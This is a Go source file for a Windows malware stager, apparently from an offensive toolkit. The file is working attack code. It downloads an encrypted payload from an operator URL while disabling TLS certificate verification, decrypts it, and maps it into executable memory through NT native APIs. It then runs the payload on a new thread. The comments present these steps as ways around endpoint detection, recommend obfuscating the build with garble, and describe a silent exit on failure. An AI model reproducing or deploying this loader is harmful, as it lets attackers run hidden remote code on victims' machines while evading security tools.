//go:build windows && amd64

// Stager fetches an encrypted Crystal Palace PICO over HTTPS, decrypts it with
// ChaCha20-Poly1305, allocates executable memory using NT native APIs (avoiding
// the Win32 VirtualAlloc/VirtualProtect fingerprint), and launches the PICO on a
// new thread.
//
// Key/URL are baked in at compile time via -ldflags:
//
//	-X main.PayloadURL=https://...
//	-X main.KeyHex=<64 hex chars>   (32-byte ChaCha20 key)
//	-X main.NonceHex=<24 hex chars>  (12-byte nonce)
//
// Build with garble for full symbol + string obfuscation:
//
//	GOOS=windows GOARCH=amd64 garble -literals build -ldflags "..." -o stager.exe .
package main

import (
	"crypto/tls"
	"encoding/hex"
	"io"
	"net/http"
	"unsafe"

	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/sys/windows"
)

// Injected by crystalkit stage (or manually via -ldflags).
var (
	PayloadURL = ""
	KeyHex     = ""
	NonceHex   = ""
)

func main() {
	key, err := hex.DecodeString(KeyHex)
	if err != nil || len(key) != chacha20poly1305.KeySize {
		return
	}
	nonce, err := hex.DecodeString(NonceHex)
	if err != nil || len(nonce) != chacha20poly1305.NonceSize {
		return
	}

	ciphertext, err := fetchPayload(PayloadURL)
	if err != nil || len(ciphertext) == 0 {
		return
	}

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return
	}

	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		// Decryption failure → payload was modified or wrong key; silent exit.
		return
	}

	execPICO(plaintext)
}

// fetchPayload downloads the encrypted payload, accepting the operator's
// self-signed certificate (the payload itself is authenticated via AEAD).
func fetchPayload(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			//nolint:gosec // self-signed operator cert; payload integrity via ChaCha20-Poly1305 AEAD
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// execPICO maps the PICO into executable memory using NT native APIs and spawns
// it on a dedicated thread.
//
// Memory lifecycle:
//  1. NtAllocateVirtualMemory  — PAGE_READWRITE  (no executable page ever RWX)
//  2. Copy bytes
//  3. NtProtectVirtualMemory   — PAGE_EXECUTE_READ
//  4. NtCreateThreadEx         — run entry point
//  5. NtWaitForSingleObject    — wait for thread (keeps process alive)
func execPICO(pico []byte) {
	size := uintptr(len(pico))

	base, err := ntAlloc(size)
	if err != nil {
		return
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)
	copy(dst, pico)

	if err := ntProtect(base, size, windows.PAGE_EXECUTE_READ); err != nil {
		return
	}

	hThread, err := ntCreateThread(base)
	if err != nil {
		return
	}

	_, _ = windows.WaitForSingleObject(hThread, windows.INFINITE)
}
